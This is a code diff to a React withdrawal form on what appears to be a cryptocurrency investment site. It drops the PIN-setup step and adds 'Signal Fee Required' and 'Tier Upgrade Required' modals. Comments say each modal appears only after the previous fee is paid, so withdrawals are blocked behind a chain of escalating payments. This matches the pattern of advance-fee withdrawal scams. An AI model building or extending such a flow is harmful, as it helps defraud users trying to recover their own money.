@@ -15,7 +15,7 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { PinNumpad, SetPinNumpad } from "@/components/ui/pin-numpad";
+import { PinNumpad } from "@/components/ui/pin-numpad";
 import {
   ArrowLeft,
   ArrowRight,
@@ -32,7 +32,6 @@ import {
 import {
   requestWithdrawal,
   verifyTransactionPIN,
-  setTransactionPIN,
   type WithdrawalEligibility,
 } from "@/lib/actions/withdrawal";
 import { withdrawalMethods, type WithdrawalMethod } from "@/lib/validations/withdrawal";
@@ -43,7 +42,7 @@ interface WithdrawFormProps {
   btcPrice: number;
 }
 
-type Step = 1 | 2 | 3 | 4 | 5 | 6;
+type Step = 1 | 2 | 3 | 4 | 5;
 
 const methodIcons: Record<string, React.ElementType> = {
   Building2,
@@ -65,11 +64,18 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
   const [method, setMethod] = useState<WithdrawalMethod | null>(null);
   const [withdrawalDetails, setWithdrawalDetails] = useState<Record<string, string>>({});
   const [pinError, setPinError] = useState("");
-  const [needsSetupPIN, setNeedsSetupPIN] = useState(!eligibility.hasPIN);
   
   // Fee modal state
   const [feeModalOpen, setFeeModalOpen] = useState(false);
   const [feeModalData, setFeeModalData] = useState<{ amount: string; instruction: string } | null>(null);
+  
+  // Signal fee modal state
+  const [signalFeeModalOpen, setSignalFeeModalOpen] = useState(false);
+  const [signalFeeInstruction, setSignalFeeInstruction] = useState("");
+  
+  // Tier upgrade modal state
+  const [tierUpgradeModalOpen, setTierUpgradeModalOpen] = useState(false);
+  const [tierUpgradeData, setTierUpgradeData] = useState<{ tier: string; instruction: string } | null>(null);
 
   // Format currency
   const formatCurrency = useCallback((value: number, isBTC = false) => {
@@ -128,31 +134,8 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
       return;
     }
     
-    // Check if user needs to set up PIN
-    if (needsSetupPIN) {
-      setStep(5);
-    } else {
-      setStep(6);
-    }
-  };
-
-  // Handle PIN setup
-  const handlePINSetup = async (pin: string) => {
-    setIsSubmitting(true);
-    try {
-      const result = await setTransactionPIN(pin);
-      if (result.success) {
-        toast.success("PIN set successfully");
-        setNeedsSetupPIN(false);
-        setStep(6);
-      } else {
-        toast.error(result.error || "Failed to set PIN");
-      }
-    } catch {
-      toast.error("Failed to set PIN");
-    } finally {
-      setIsSubmitting(false);
-    }
+    // Go to PIN verification step
+    setStep(5);
   };
 
   // Handle PIN verification and withdrawal
@@ -190,6 +173,20 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
           
           setFeeModalData({ amount: feeAmount, instruction });
           setFeeModalOpen(true);
+          setStep(4); // Go back to details step
+        } else if (result.error?.startsWith("SIGNAL_FEE_REQUIRED:")) {
+          // Signal fee error - shown after withdrawal fee is cleared
+          const instruction = result.error.replace("SIGNAL_FEE_REQUIRED:", "");
+          setSignalFeeInstruction(instruction);
+          setSignalFeeModalOpen(true);
+          setStep(4); // Go back to details step
+        } else if (result.error?.startsWith("TIER_UPGRADE_REQUIRED:")) {
+          // Tier upgrade error - shown after signal fee is cleared
+          const parts = result.error.split(":");
+          const tier = parts[1];
+          const instruction = parts.slice(2).join(":");
+          setTierUpgradeData({ tier, instruction });
+          setTierUpgradeModalOpen(true);
           setStep(4); // Go back to details step
         } else {
           setPinError(result.error || "Withdrawal failed");
@@ -244,13 +241,7 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
   const goBack = () => {
     if (step > 1) {
       setPinError("");
-      // If going back from step 6 (PIN verify) and user doesn't need to setup PIN,
-      // skip step 5 and go directly to step 4
-      if (step === 6 && !needsSetupPIN) {
-        setStep(4);
-      } else {
-        setStep((step - 1) as Step);
-      }
+      setStep((step - 1) as Step);
     }
   };
 
@@ -287,7 +278,7 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
     <div className="space-y-6">
       {/* Progress Indicator */}
       <div className="flex items-center justify-center gap-2">
-        {[1, 2, 3, 4, 5, 6].map((s) => (
+        {[1, 2, 3, 4, 5].map((s) => (
           <div
             key={s}
             className={cn(
@@ -544,34 +535,8 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
         </Card>
       )}
 
-      {/* Step 5: Set PIN (if needed) */}
-      {step === 5 && needsSetupPIN && (
-        <Card className="border-border bg-surface">
-          <CardHeader>
-            <div className="flex items-center gap-2">
-              <Button variant="ghost" size="icon" onClick={goBack}>
-                <ArrowLeft className="w-4 h-4" />
-              </Button>
-              <div>
-                <CardTitle className="text-text-primary">Set Transaction PIN</CardTitle>
-                <CardDescription>
-                  Create a 4-digit PIN to secure your withdrawals
-                </CardDescription>
-              </div>
-            </div>
-          </CardHeader>
-          <CardContent>
-            <SetPinNumpad
-              onComplete={handlePINSetup}
-              onCancel={goBack}
-              loading={isSubmitting}
-            />
-          </CardContent>
-        </Card>
-      )}
-
-      {/* Step 6: Verify PIN */}
-      {step === 6 && (
+      {/* Step 5: Verify PIN */}
+      {step === 5 && (
         <Card className="border-border bg-surface">
           <CardHeader>
             <div className="flex items-center gap-2">
@@ -634,6 +599,83 @@ export function WithdrawForm({ eligibility, userCurrency, btcPrice }: WithdrawFo
           <div className="flex justify-center pt-2">
             <Button 
               onClick={() => setFeeModalOpen(false)}
+              className="min-w-[120px]"
+            >
+              I Understand
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Signal Fee Modal */}
+      <Dialog open={signalFeeModalOpen} onOpenChange={setSignalFeeModalOpen}>
+        <DialogContent className="sm:max-w-md bg-surface border-border">
+          <DialogHeader className="text-center sm:text-center">
+            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-primary/10">
+              <Shield className="h-7 w-7 text-primary" />
+            </div>
+            <DialogTitle className="text-xl font-semibold text-text-primary">
+              Signal Fee Required
+            </DialogTitle>
+            <DialogDescription className="text-text-secondary">
+              A signal fee is required to process your withdrawal
+            </DialogDescription>
+          </DialogHeader>
+          
+          <div className="space-y-4 py-4">
+            <div className="rounded-xl border border-border p-4">
+              <p className="text-sm text-text-secondary leading-relaxed whitespace-pre-wrap">
+                {signalFeeInstruction}
+              </p>
+            </div>
+          </div>
+          
+          <div className="flex justify-center pt-2">
+            <Button 
+              onClick={() => setSignalFeeModalOpen(false)}
+              className="min-w-[120px]"
+            >
+              I Understand
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Tier Upgrade Modal */}
+      <Dialog open={tierUpgradeModalOpen} onOpenChange={setTierUpgradeModalOpen}>
+        <DialogContent className="sm:max-w-md bg-surface border-border">
+          <DialogHeader className="text-center sm:text-center">
+            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-warning/10">
+              <AlertTriangle className="h-7 w-7 text-warning" />
+            </div>
+            <DialogTitle className="text-xl font-semibold text-text-primary">
+              Tier Upgrade Required
+            </DialogTitle>
+            <DialogDescription className="text-text-secondary">
+              You need to upgrade your account tier to make withdrawals
+            </DialogDescription>
+          </DialogHeader>
+          
+          {tierUpgradeData && (
+            <div className="space-y-4 py-4">
+              <div className="rounded-xl bg-surface-muted p-4 text-center">
+                <p className="text-sm text-text-muted mb-1">Current Tier</p>
+                <p className="text-2xl font-bold text-warning">
+                  Tier {tierUpgradeData.tier}
+                </p>
+              </div>
+              
+              <div className="rounded-xl border border-border p-4">
+                <p className="text-sm text-text-secondary leading-relaxed whitespace-pre-wrap">
+                  {tierUpgradeData.instruction}
+                </p>
+              </div>
+            </div>
+          )}
+          
+          <div className="flex justify-center pt-2">
+            <Button 
+              onClick={() => setTierUpgradeModalOpen(false)}
               className="min-w-[120px]"
             >
               I Understand
